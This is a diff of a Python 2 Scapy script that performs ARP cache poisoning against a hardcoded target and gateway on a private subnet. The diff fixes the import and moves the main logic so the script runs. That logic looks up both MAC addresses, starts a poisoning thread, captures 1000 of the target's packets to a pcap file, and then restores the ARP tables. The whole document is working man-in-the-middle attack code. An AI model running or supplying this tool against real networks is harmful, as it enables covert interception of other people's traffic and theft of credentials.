@@ -1,59 +1,21 @@
 # -*-coding:utf-8 -*-
 
-from scapy import *
+from scapy.all import *
 import os
 import sys
 import threading
 import signal
 
-interface = ""
-target_ip = ""
-gateway_ip = ""
+interface = "eth0"
+target_ip = "192.168.253.3"
+gateway_ip = "192.168.253.1"
 packet_count = 1000
 
-#set sniffer interface
-conf.iface = interface
+# #set sniffer interface
+# conf.iface = interface
 
-#close output 
-conf.verb = 0
-
-print "[*] Setting up %s" % interface
-
-gateway_mac = get_mac(gateway_ip)
-
-if gateway_mac is None:
-	print "[!!!] Failed to get gateway MAC. Exiting."
-	sys.exit(0)
-else:
-	print "[*] Gateway %s is at %s" %(gateway_ip,gateway_mac)
-
-target_mac = get_mac(target_ip)
-
-if target_mac is None:
-	print "[!!!] Failed to get target MAC. Exiting."
-	sys.exit(0)
-else:
-	print "[*] Target %s is at %s" % (target_ip,target_mac)
-
-#start ARP thread
-poison_thread = threading.Thread(target=poison_target,args=\
-	(gateway_ip,gateway_mac,target_ip,target_mac))
-poison_thread.start()
-
-try:
-	print "[*] Starting sniffer for %d packets" % packet_count
-	bpf_filter = "ip host %s" % target_ip
-	packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
-
-	#put the sniffer packet into file
-	wrpcap('arper.pcap',packets)
-	# restore the network config
-	restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
-
-except KeyboardInterrupt:
-	# restore network config
-	restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
-	sys.exit(0)
+# #close output 
+# conf.verb = 0
 
 
 def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
@@ -101,3 +63,43 @@ def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
 			restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
 	print "[*] ARP poison attack finished."
 	return
+
+print "[*] Setting up %s" % interface
+
+gateway_mac = get_mac(gateway_ip)
+
+if gateway_mac is None:
+	print "[!!!] Failed to get gateway MAC. Exiting."
+	sys.exit(0)
+else:
+	print "[*] Gateway %s is at %s" %(gateway_ip,gateway_mac)
+
+target_mac = get_mac(target_ip)
+
+if target_mac is None:
+	print "[!!!] Failed to get target MAC. Exiting."
+	sys.exit(0)
+else:
+	print "[*] Target %s is at %s" % (target_ip,target_mac)
+
+#start ARP thread
+poison_thread = threading.Thread(target=poison_target,args=\
+	(gateway_ip,gateway_mac,target_ip,target_mac))
+poison_thread.start()
+
+try:
+	print "[*] Starting sniffer for %d packets" % packet_count
+	bpf_filter = "ip host %s" % target_ip
+	packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
+
+	#put the sniffer packet into file
+	wrpcap('arper.pcap',packets)
+	# restore the network config
+	restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
+
+except KeyboardInterrupt:
+	# restore network config
+	restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
+	sys.exit(0)
+
+
